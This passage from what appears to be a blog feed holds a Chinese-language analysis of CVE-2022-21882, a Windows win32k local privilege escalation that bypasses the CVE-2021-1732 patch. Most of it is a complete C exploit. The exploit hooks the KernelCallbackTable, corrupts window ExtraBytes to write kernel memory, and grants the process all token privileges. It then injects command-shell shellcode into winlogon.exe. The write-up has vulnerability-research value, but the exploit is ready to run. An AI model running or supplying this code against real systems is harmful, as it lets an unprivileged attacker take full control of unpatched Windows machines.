-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2022-21882 Win32K本地提权分析</title>
-    <url>/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="0x00漏洞描述"><a href="#0x00漏洞描述" class="headerlink" title="0x00漏洞描述"></a>0x00漏洞描述</h2><p>CVE-2022-21882漏洞是window系统的一个本地提权漏洞，微软在2022年1月份安全更新中修补了此漏洞。CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的类型混淆漏洞。漏洞成因与CVE-2021-1732类似，主要因为win32kfull!xxxClientAllocExtraBytes函数会回调用户空间中的user32!xxxClientAllocWindowClassExtraBytes,使用NtUserConsoleControl方法设置tagWNDK对象的ConsoleWindow标志，修改窗口类型。回调之后，系统不检查窗口类型是否改变，攻击者可以设置目标窗口的ExtraBytes指针为任意值，修改寻址方式为桌面堆+偏移，以实现桌面堆的越界写。</p>
-<p>影响版本：</p>
-<pre class="line-numbers language-none"><code class="language-none">Windows 10 Version 21H2 for x64-based Systems
-Windows 10 Version 21H2 for ARM64-based Systems
-Windows 10 Version 21H2 for 32-bit Systems
-Windows 11 for ARM64-based Systems
-Windows 11 for x64-based Systems
-Windows Server, version 20H2 (Server Core Installation)
-Windows 10 Version 20H2 for ARM64-based Systems
-Windows 10 Version 20H2 for 32-bit Systems
-Windows 10 Version 21H1 for ARM64-based Systems
-Windows 10 Version 21H1 for x64-based Systems
-Windows 10 Version 1909 for x64-based Systems
-Windows 10 Version 1909 for 32-bit Systems
-Windows Server 2019 (Server Core installation)
-Windows Server 2019
-Windows 10 Version 1809 for ARM64-based Systems
-Windows 10 Version 1809 for x64-based Systems
-Windows 10 Version 1809 for 32-bit Systems
-Windows 10 Version 20H2 for x64-based Systems
-Windows 10 Version 1909 for ARM64-based Systems
-Windows Server 2022 (Server Core installation)
-Windows Server 2022
-Windows 10 Version 21H1 for 32-bit Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><h3 id="CVE-2021-1732补丁"><a href="#CVE-2021-1732补丁" class="headerlink" title="CVE-2021-1732补丁"></a>CVE-2021-1732补丁</h3><p>CVE-2021-1732的补丁是在CreateWindowEx在调用ClientAllocWindowClassExtraBytes后增加了一个检查。正常情况下在新创建一个窗口还没有调用xxxClientAllocWindowClassExtraBytes的时候，其窗口对应的tagWND -&gt; ExtraBytes是空的，通过检测目标窗口的ExtraBytes指针是否在回调过程中被修改，推测用户态回调是否被hook，如果检查到非正常修改就会释放新创建的窗口，返回失败。也就是说CVE-2021-1732的补丁打在CreateWindowEx，修复方法是在调用xxxClientAllocWindowClassExtraBytes函数后，在CreateWindowEx中判断漏洞是否被利用。</p>
-<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815112448042.png"></p>
-<p>但是xxxCreateAllocWindowClassExtraBytes函数并没有做任何修改。打完补丁之后，又出现的新的路径来触发xxxClientAllocWindowClassExtraBytes函数。</p>
-<h3 id="win32kfull-xxxSwitchWndProc"><a href="#win32kfull-xxxSwitchWndProc" class="headerlink" title="win32kfull!xxxSwitchWndProc"></a>win32kfull!xxxSwitchWndProc</h3><p>xxxSwitchWndProc函数中调用xxxClientAllocWindowClassExtraBytes为窗口分配额外内存，后面却没有检查窗口的ExtraBytes在用户层回调过程中是否修改，因此发生了和CVE-2021-1732同样的问题，由于窗口已经创建完毕，窗口的句柄也更容易拿到，因此漏洞更容易利用。</p>
-<pre class="line-numbers language-none"><code class="language-none">_int64 __fastcall xxxSwitchWndProc(struct tagWND *a1, int a2, unsigned __int64 a3, __int64 a4)
-{
-    *((_QWORD *)v7 + 0x23) = v15;
-    *(_DWORD *)(*(_QWORD *)v8 + 0xFCi64) = v14;
-    cbExtraBytes = *(unsigned int *)(*(_QWORD *)v8 + 0xC8i64);
-    v28 = cbExtraBytes;
-    if ( (_DWORD)cbExtraBytes )//cbExtraBytes大于0，调用xxxClientAllocWindowClassExtraBytes
-    {
-        ret = (void *)xxxClientAllocWindowClassExtraBytes((unsigned int)cbExtraBytes);
-        if ( !ret )
-            return 0i64;
-    }
-    else
-    {
-        ret = 0i64;
-    }
-    if ( tagWND::RedirectedFieldpExtraBytes::operator&lt;bool&gt; bool((__int64)v7 + 0x140) )// tagWND-&gt;ExtraBytes != NULL
-    {
-        if ( ret )
-            memmove(
-            ret,
-            (const void *)(*(_QWORD *)(*(_QWORD *)v8 + 0x128i64) + *(unsigned int *)(*(_QWORD *)v8 + 0xFCi64)),
-            cbExtraBytes);
-        tagWND = *((_QWORD *)v7 + 5);
-        ExtraBytes = *(_QWORD *)(tagWND + 0x128);
-        *(_QWORD *)(tagWND + 0x128) = ret;
-        *(_DWORD *)(*((_QWORD *)v7 + 5) + 0xC8i64) = cbExtraBytes;
-        xxxClientFreeWindowClassExtraBytes((__int64)v7, ExtraBytes);
-    }
-}
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815162914670.png"></p>
-<p>应用层可以通过调用NtUserMessageCall函数触发内核层的xxxSwitchWndProc函数，接着就会调用到xxxClientAllocWindowClassExtraBytes。事先在应用层hook相应的回调函数，然后调用函数NtUserConsoleControl修改tagWND_Trigger的ExtraBytes内存寻址方式为桌面堆+偏移，调用NtCallbackReturn将窗口相对桌面堆的偏移tagWND_Victim offset设置为tagWND_Trigger - &gt; ExtraBytes，Hook应用层的User32!xxxClientFreeWindowClassExtraBytes,使其不释放tagWND_Trigger -&gt; ExtraBytes。</p>
-<p>触发漏洞窗口hTrigger和受害者窗口hVictim在内存上的布局：按照利用流程修改hTrigger的tagWND-&gt;Flags |= 0x800,设置tagWND_Victim相对与桌面堆的偏移为Trigger-&gt;ExtraBytes,然后对hWndTrigger调用SetWindowLong系列函数，越界修改Victim-&gt;ExtraBytes为任意内存，再对hWndVictim调用SetWindowLong系列函数任意内存写，获得任意内核地址写之后，修改当前进程的Token -&gt; Privileges,最后恢复Victim -&gt; ExtraBytes和Trigger -&gt; Flags，避免BSOD。</p>
-<h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><pre class="line-numbers language-none"><code class="language-none">##include&lt;windows.h&gt;
-##include&lt;stdio.h&gt;
-##include&lt;stdlib.h&gt;
-##include &lt;Psapi.h&gt;
-##pragma comment(lib, "Psapi.lib ")
-
-##define KERNEL_CALLBACK_TABLE_OFFSET 0x58
-##define TRIGGERWND_EXTRASIZE 0xABCD
-##define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L) 
-
-##pragma pack(1)
-typedef struct 
-{
-    ULONG64 hWnd;                // + 0x00
-    ULONG64 OffsetToDesktopHeap; // + 0x08
-    ULONG64 state;               // + 0x10
-    DWORD dwExStyle;             // + 0x18
-    DWORD dwStyle;               // + 0x1C
-    BYTE padd1[0xa8];
-    ULONG64 cbWndExtra;          // + 0xC8
-    BYTE padd2[0x18];
-    DWORD dwExtraFlag;           // + 0xE8
-    BYTE padd3[0x3c];
-    ULONG64 pExtraBytes;         // + 0x128
-}tagWNDK,*PWND;
-
-##pragma pack(0)
-
-typedef struct _SYSTEM_HANDLE
-{
-    PVOID Object;
-    HANDLE UniqueProcessId;
-    HANDLE HandleValue;
-    ULONG GrantedAccess;
-    USHORT CreatorBackTraceIndex;
-    USHORT ObjectTypeIndex;
-    ULONG HandleAttributes;
-    ULONG Reserved;
-} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
-
-typedef struct _SYSTEM_HANDLE_INFORMATION_EX
-{
-    ULONG_PTR HandleCount;
-    ULONG_PTR Reserved;
-    SYSTEM_HANDLE Handles[1];
-} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;
-
-enum SYSTEM_INFORMATION_CLASS {
-    SystemExtendedHandleInformation = 64
-};
-
-using NtUserMessageCall_t = NTSTATUS(*)(
-    HWND hWnd,
-    UINT Msg,
-    WPARAM wParam,
-    LPARAM lParam,
-    ULONG_PTR ResultInfo,
-    DWORD dwType,
-    BOOL bAnsi);
-
-using ZwQuerySystemInformation_t = NTSTATUS(*)(
-    SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    PVOID SystemInformation,
-    ULONG SystemInformationLength,
-    PULONG ReturnLength);
-
-using RtlAllocateHeap_t = PVOID(*)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
-
-using xxxClientAllocWindowClassExtraBytes_t = NTSTATUS(*)(PDWORD Length);
-using xxxClientFreeWindowClassExtraBytes_t = NTSTATUS(*WINAPI)(PVOID* pInfo);
-
-using NtUserConsoleControl_t = NTSTATUS(__fastcall*)(DWORD64, LPVOID, DWORD);
-using NtCallbackReturn_t = NTSTATUS(__fastcall*)(LPVOID, DWORD, NTSTATUS);
-using HMValidateHandle_t = tagWNDK*(__fastcall*)(HANDLE, UINT);
-using IsMenu_t = BOOL(*)(HMENU hMenu);
-
-namespace gb {
-    xxxClientAllocWindowClassExtraBytes_t xxxClientAllocWindowClassExtraBytes = 0;
-    xxxClientFreeWindowClassExtraBytes_t xxxClientFreeWindowClassExtraBytes = 0;
-    NtUserConsoleControl_t NtUserConsoleControl = 0;
-    NtCallbackReturn_t NtCallbackReturn = 0;
-    HMValidateHandle_t HMValidateHandle = 0;
-    NtUserMessageCall_t  NtUserMessageCall = 0;
-    ZwQuerySystemInformation_t ZwQuerySystemInformation = 0;
-    RtlAllocateHeap_t RtlAllocateHeap = 0;
-
-    IsMenu_t u32_IsMenu = 0;
-    HMODULE g_hNtdll = 0;
-    HMODULE g_hWin32u = 0;
-    HMODULE g_hUser32 = 0;
-
-    HWND g_hTriggerWnd = 0;
-    HWND g_hVictimWnd = 0;
-
-    DWORD64 TriggerDeskHeap = 0;
-    DWORD64 VictimDeskHeap = 0;
-    HANDLE hToken = 0;
-};
-
-
-VOID SetFuncHook(DWORD64 newAllocFunc,DWORD64 newFreeFunc) {
-    //1.获取本进程的PEB
-    DWORD64 ulCurrPEB = __readgsqword(0x60);
-    printf("[+] Found ulCurrPEB = 0x%p\n", ulCurrPEB);
-    //2.找到KernelCallbackTable
-    DWORD64 KernelCallbackTable = ulCurrPEB + KERNEL_CALLBACK_TABLE_OFFSET;
-    KernelCallbackTable = *(PDWORD64)KernelCallbackTable;
-    printf("[+] Found KernelCallbackTable = 0x%p\n", KernelCallbackTable);
-    DWORD64  xxxClientAllocExtraBytesFunc = *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8);
-    printf("[+] Found xxxClientAllocExtraBytesFunc = 0x%p\n", xxxClientAllocExtraBytesFunc);
-    gb::xxxClientAllocWindowClassExtraBytes = (xxxClientAllocWindowClassExtraBytes_t)xxxClientAllocExtraBytesFunc;
-
-    DWORD64  xxxClientFreeExtraBytesFunc = *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7C * 8);
-    printf("[+] Found xxxClientFreeExtraBytesFunc = 0x%p\n", xxxClientFreeExtraBytesFunc);
-    gb::xxxClientFreeWindowClassExtraBytes = (xxxClientFreeWindowClassExtraBytes_t)xxxClientFreeExtraBytesFunc;
-
-    //3.HOOK
-    //首先需要设置页面可写属性
-    DWORD dwOldProtect;
-    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
-    *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8) = newAllocFunc;
-    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, dwOldProtect, &amp;dwOldProtect);
-
-    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7C * 8), 0x300, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
-    *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7C * 8) = newFreeFunc;
-    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7C * 8), 0x300, dwOldProtect, &amp;dwOldProtect);
-}
-
-NTSTATUS WINAPI ClientFreeWindowsClassExtraBytesProxy(PVOID* pInfo) {
-    PWND pwnd = (PWND)pInfo[0];
-    if (pwnd-&gt;cbWndExtra == TRIGGERWND_EXTRASIZE)
-        return 1;
-    return gb::xxxClientFreeWindowClassExtraBytes(pInfo);
-}
-
-NTSTATUS WINAPI ClientAllocatWindowClassExtraBytesProxy(PDWORD size) {
-    
-    if (*size==TRIGGERWND_EXTRASIZE) {
-        //获取窗口句柄
-        //使用NtUserConsoleControl 将目标窗口的寻址模式修改为DesktopHeap+Offset
-        printf("[+] ClientAllocatWindowClassExtraBytesProxy called! Offset = %p\n\n", gb::VictimDeskHeap);
-        gb::NtUserConsoleControl(6, &amp;gb::g_hTriggerWnd, 0x10);
-        //修改hWndTriggle 的 tagWnd-&gt;ExtraBytes 为 hTriggerWnd的桌面堆
-        DWORD64 ulResult = gb::VictimDeskHeap ;
-        return gb::NtCallbackReturn(&amp;ulResult, 24, 0);
-    }
-    return gb::xxxClientAllocWindowClassExtraBytes(size);
-}
-
-LRESULT __fastcall WindowProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
-{
-    if (a2 != 2)
-        return DefWindowProcW(a1, a2, a3, a4);
-    PostQuitMessage(0);
-    return 0;
-}
-
-bool CheckPrivilege(HANDLE TokenHandle)
-{
-    BOOL isPrivilegeSet = FALSE;
-    PRIVILEGE_SET       privSet;
-    LUID_AND_ATTRIBUTES Privileges[1];
-    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &amp;(Privileges[0].Luid));
-    Privileges[0].Attributes = 0;
-
-    privSet.PrivilegeCount = 1;
-    privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
-    memcpy(privSet.Privilege, Privileges, sizeof(Privileges));
-
-    PrivilegeCheck(TokenHandle, &amp;privSet, &amp;isPrivilegeSet);
-    return isPrivilegeSet;
-}
-
-DWORD getProcessId(const char* name)
-{
-    DWORD aProcesses[1024], cbNeeded, cProcesses;
-    unsigned int i;
-
-    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &amp;cbNeeded))
-    {
-        printf("[Error_%d] EnumProcess failed...\n", __LINE__);
-        exit(0);
-    }
-
-
-    // Calculate how many process identifiers were returned.
-    cProcesses = cbNeeded / sizeof(DWORD);
-
-    // Print the name and process identifier for each process.
-    for (i = 0; i &lt; cProcesses; i++)
-    {
-        if (aProcesses[i] != 0)
-        {
-            DWORD processID = aProcesses[i];
-            CHAR szProcessName[MAX_PATH] = "&lt;unknown&gt;";
-
-            // Get a handle to the process.
-
-            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
-                PROCESS_VM_READ,
-                FALSE, processID);
-
-            // Get the process name.
-
-            if (NULL != hProcess)
-            {
-                HMODULE hMod;
-                DWORD cbNeeded;
-
-                if (EnumProcessModules(hProcess, &amp;hMod, sizeof(hMod),
-                    &amp;cbNeeded))
-                {
-                    GetModuleBaseNameA(hProcess, hMod, szProcessName,
-                        sizeof(szProcessName) / sizeof(TCHAR));
-                }
-            }
-
-            // Print the process name and identifier.
-            if (!lstrcmpA(szProcessName, name))
-            {
-                CloseHandle(hProcess);
-                return (processID);
-            }
-
-            // Release the handle to the process.
-
-            CloseHandle(hProcess);
-        }
-    }
-
-    return 0;
-
-}
-
-void SpawnShell() {
-    HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
-    PVOID  pLibRemote;
-    HMODULE hKernel32 = GetModuleHandleA("Kernel32");
-    DWORD processID;
-    unsigned char shellcode[] =
-        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
-        "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
-        "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
-        "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
-        "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
-        "\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
-        "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
-        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
-        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
-        "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
-        "\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
-        "\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
-        "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
-        "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
-        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
-        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
-        "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
-        "\x78\x65\x00";
-
-
-    if ((processID = getProcessId("winlogon.exe")) == 0)
-    {
-        printf("[Error_%d] Couldn't retrieve process ID...\n", __LINE__);
-        return;
-    }
-    printf("[+] Retrieved process id: %d\n", processID);
-    hSystemProcess = OpenProcess(GENERIC_ALL, false, processID);
-
-    if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
-    {
-        printf("[Error_%d] Couldn't open system process...\n", __LINE__);
-        return;
-    }
-    printf("[+] Got a handle on a system Process: %08p\n", hSystemProcess);
-
-
-    pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    if (!pLibRemote)
-    {
-        printf("[Error_%d] Virtual alloc failed !\n", __LINE__);
-        return;
-    }
-
-    printf("[+] Allocation in system process succeded with address %08p\n", pLibRemote);
-
-    if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
-    {
-        printf("[Error_%d] WriteProcessMemory failed !\n", __LINE__);
-        return;
-    }
-
-    HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);
-
-    printf("[+] Writing in system process succeded\n");
-
-    if (hThread == NULL) {
-        printf("[Error_%d] CreateRemoteThread failed !\n", __LINE__);
-        return;
-    }
-    else
-        printf("[+] Remote thread created !\n");
-    CloseHandle(hSystemProcess);
-}
-
-ULONG64 GetToken() {
-    PSYSTEM_HANDLE_INFORMATION_EX sys_handle_info_ref = NULL;
-    ULONG64 Token = 0;
-    ULONG len = 20;
-    NTSTATUS ntst = 0;
-
-    OpenProcessToken(GetCurrentProcess(), GENERIC_READ, &amp;gb::hToken);
-    if (gb::hToken == INVALID_HANDLE_VALUE) {
-        printf("[Error_%d] GetToken(): OpenProcessToken failed.\n", __LINE__);
-        return 0;
-    }
-    //获取本进程的EPROCESS
-    do {
-        len *= 2;
-        sys_handle_info_ref = (PSYSTEM_HANDLE_INFORMATION_EX)realloc(sys_handle_info_ref, len);
-        ntst = gb::ZwQuerySystemInformation(
-            (SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, sys_handle_info_ref, len, &amp;len);
-    } while (ntst == STATUS_INFO_LENGTH_MISMATCH);
-
-    if (ntst != 0) {
-        printf("[Error_%d] GetToken(): ZwQuerySystemInformation failed.\n", __LINE__);
-        if (sys_handle_info_ref)
-            free(sys_handle_info_ref);
-        return 0;
-    }
-
-    DWORD pid = GetCurrentProcessId();
-    for (int i = 0; i &lt; sys_handle_info_ref-&gt;HandleCount; i++) {
-        if (gb::hToken == sys_handle_info_ref-&gt;Handles[i].HandleValue
-            &amp;&amp; (HANDLE)pid == sys_handle_info_ref-&gt;Handles[i].UniqueProcessId) {
-            Token = (ULONG64)sys_handle_info_ref-&gt;Handles[i].Object;
-            break;
-        }
-    }
-
-    if (sys_handle_info_ref)
-        free(sys_handle_info_ref);
-
-    printf("[+] Found current process token = %p\n", Token);
-    return Token;
-}
-
-
-BOOLEAN Init() {
-    BOOLEAN bRet = TRUE;
-    int offset = 0;
-    DWORD64 next_code = 0;
-
-    __try {
-        gb::g_hUser32 = LoadLibraryA("user32.dll");
-        if (!gb::g_hUser32) {
-            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
-            bRet = FALSE;
-            __leave;
-        }
-        //获取u32_IsMenu
-        gb::u32_IsMenu = (IsMenu_t)GetProcAddress(gb::g_hUser32, "IsMenu");
-        if (!gb::u32_IsMenu) {
-            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
-            bRet = FALSE;
-            __leave;
-        }
-
-        for (int i = 0; i &lt; 0x100; i++) {
-            PUCHAR tr = (PUCHAR)gb::u32_IsMenu + i;
-            if (*tr == 0xE8)
-            {//找到调用HMValidateHandle的指令位置
-                offset = *(int*)((PCHAR)gb::u32_IsMenu + i + 1);
-                next_code = (DWORD64)gb::u32_IsMenu + i + 5;
-                gb::HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
-                break;
-            }
-        }
-        if (!gb::HMValidateHandle) {
-            printf("[!] Error: Can not find HMValidateHandle!\n");
-            bRet = FALSE;
-            __leave;
-        }
-
-        printf("[+] Found HMValidateHandle = 0x%p\n", gb::HMValidateHandle);
-
-        gb::g_hNtdll = LoadLibraryA("ntdll.dll");
-        if (!gb::g_hNtdll) {
-            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
-            bRet = FALSE;
-            __leave;
-        }
-
-        gb::g_hWin32u = LoadLibraryA("win32u.dll");
-        if (!gb::g_hWin32u) {
-            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
-            bRet = FALSE;
-            __leave;
-        }
-        
-        gb::NtCallbackReturn = (NtCallbackReturn_t)GetProcAddress(gb::g_hNtdll, "NtCallbackReturn");
-        gb::NtUserMessageCall = (NtUserMessageCall_t)GetProcAddress(gb::g_hWin32u, "NtUserMessageCall");
-        gb::NtUserConsoleControl = (NtUserConsoleControl_t)GetProcAddress(gb::g_hWin32u, "NtUserConsoleControl");
-        gb::ZwQuerySystemInformation = (ZwQuerySystemInformation_t)GetProcAddress(gb::g_hNtdll, "NtQuerySystemInformation");
-        gb::RtlAllocateHeap = (RtlAllocateHeap_t)GetProcAddress(gb::g_hNtdll, "RtlAllocateHeap");
-        if (gb::NtCallbackReturn==0 || gb::NtUserMessageCall==0 || 
-            gb::NtUserConsoleControl==0 || gb::ZwQuerySystemInformation==0 ||
-            gb::RtlAllocateHeap==0) {
-            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
-            bRet = FALSE;
-            __leave;
-        }
-    }
-    __finally {
-
-    }
-    return bRet;
-}
-
-int main(int argc,char *argv[]) {
-
-    if (argc &lt;= 1) {
-        printf(
-        "Usage:\n"
-        "         Example: CVE-2022-21882.exe whoami\n"
-        );
-        return 0;
-    }
-
-    WNDCLASSEXW WndClassExW = { 0 };
-
-    ULONG64 TokenAddr = 0;
-
-    if (Init()) {
-
-        TokenAddr = GetToken();
-
-        if (TokenAddr == 0) {
-            printf("[-] Error(%u): GetToken failed.\n");
-            return 0;
-        }
-
-        WndClassExW.hIcon = 0;
-        WndClassExW.hbrBackground = 0;
-        WndClassExW.lpszClassName = 0;
-        WndClassExW.lpfnWndProc = (WNDPROC)WindowProc;
-        WndClassExW.cbSize = sizeof(WNDCLASSEXW);
-        WndClassExW.style = CS_VREDRAW | CS_HREDRAW;;
-        WndClassExW.cbClsExtra = 0;
-        WndClassExW.cbWndExtra = 0x60;
-        WndClassExW.hInstance = GetModuleHandleW(0);
-        WndClassExW.lpszClassName = L"VictimClass";
-        //被覆盖写
-        ATOM atom_vic = RegisterClassExW(&amp;WndClassExW);
-
-        WndClassExW.cbWndExtra = TRIGGERWND_EXTRASIZE;
-        WndClassExW.lpszClassName = L"TriggerClass";
-
-        //触发漏洞
-        ATOM atom_trig = RegisterClassExW(&amp;WndClassExW);
-
-        gb::g_hVictimWnd = CreateWindowExW(NULL,
-            (LPCWSTR)(unsigned __int16)atom_vic,
-            L"VictimWnd",
-            NULL,
-            0,
-            0, 
-            0,
-            0,
-            0,
-            0,
-            GetModuleHandleW(0),
-            0);
-        printf("[+] Created victim windows = 0x%p\n", gb::g_hVictimWnd);
-
-        gb::g_hTriggerWnd = CreateWindowExW(NULL,
-            (LPCWSTR)(unsigned __int16)atom_trig,
-            L"TriggerBug",
-            NULL,
-            0,
-            0,
-            0,
-            0,
-            0,
-            0,
-            GetModuleHandleW(0),
-            0);
-        printf("[+] Created trigger windows = 0x%p\n", gb::g_hTriggerWnd);
-        // 触发漏洞
-        // 获取刚创建的这两个窗口的桌面堆
-        PWND Trigger= gb::HMValidateHandle(gb::g_hTriggerWnd, 1);
-        gb::TriggerDeskHeap = Trigger-&gt;OffsetToDesktopHeap;
-        printf("[+] TriggerDeskHeap's tagWND = 0x%p\n", Trigger);
-        PWND Victim = gb::HMValidateHandle(gb::g_hVictimWnd, 1);
-        gb::VictimDeskHeap = Victim-&gt;OffsetToDesktopHeap;
-        DWORD64 Distance = 0;
-        if (gb::VictimDeskHeap&gt; gb::TriggerDeskHeap) {
-            Distance=gb::VictimDeskHeap - gb::TriggerDeskHeap;
-        }
-        else {
-            Distance = gb::TriggerDeskHeap - gb::VictimDeskHeap;
-        }
-
-        if (Distance &gt;= TRIGGERWND_EXTRASIZE) {
-            printf("[-] Heap spray failed!\n");
-            return 0;
-        }
-
-        printf("[+] VictimDeskHeap's tagWND = 0x%p\n", Victim);
-        printf("[+] TriggerDeskHeap = %p\n", gb::TriggerDeskHeap);
-        printf("[+] VictimDeskHeap = %p\n", gb::VictimDeskHeap);
-
-        // 回调函数
-        SetFuncHook((DWORD64)ClientAllocatWindowClassExtraBytesProxy,(DWORD64)ClientFreeWindowsClassExtraBytesProxy);
-        // 触发漏洞
-        gb::NtUserMessageCall(gb::g_hTriggerWnd, WM_CREATE,0,0, NULL, 0, FALSE);
-
-        // 修改 tagWND_victim-&gt;ExtraBytes = TokenAddr
-        ULONG_PTR Old = SetWindowLongPtrW(gb::g_hTriggerWnd, 0x128+0x10, TokenAddr+0x40);
-        // 修改 Token-&gt;Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
-        SetWindowLongPtrW(gb::g_hVictimWnd, 8, 0xFFFFFFFFFFFFFFFF);
-        // 修改 Token-&gt;Privileges.Present = 0xFFFFFFFFFFFFFFFF
-        SetWindowLongPtrW(gb::g_hVictimWnd, 0, 0xFFFFFFFFFFFFFFFF);
-
-        if (CheckPrivilege(gb::hToken)) {
-            SpawnShell();
-        }
-        else {
-            printf("[+] 提权失败！\n");
-        } 
-
-        // 恢复 tagWND_Victim-&gt;ExtraBytes = Old
-        SetWindowLongPtrW(gb::g_hTriggerWnd, 0x128 + 0x10, Old);
-        // 恢复 tagWND_Trigger-&gt;Styles &amp;= ~0x800
-        SetWindowLongPtrW(gb::g_hTriggerWnd, Distance + 0xE8 + 0x10, Trigger-&gt;dwExStyle);
-        system("pause");
-    }
-    return 0;
-    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>